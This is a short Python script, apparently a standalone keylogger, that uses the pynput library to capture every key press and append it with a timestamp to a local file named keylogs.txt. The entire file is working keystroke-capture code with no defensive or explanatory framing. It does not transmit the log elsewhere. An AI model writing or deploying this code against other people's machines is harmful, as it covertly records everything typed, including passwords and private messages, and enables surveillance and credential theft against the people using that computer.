from pynput import keyboard
import time

# Prepare file to store logs
keyLogFile = open("keylogs.txt", "w")

def on_key_press(key): 
    try:
        keyLogFile = open("keylogs.txt", "a")
        keyLogFile.write(str(time.ctime())+": "+ str(key) + "\n" )
        print('{0}'.format(key)) 
    except Exception as e:
    	# Handle exception
        print(e)   
try:
    with keyboard.Listener(on_press = on_key_press) as listener:  
         listener.join() # keep the process running 
except Exception as e:
    # Handle any exception that may occur during execution of the above block.
    print('ERROR:',e)
finally:
    keyLogFile.close()
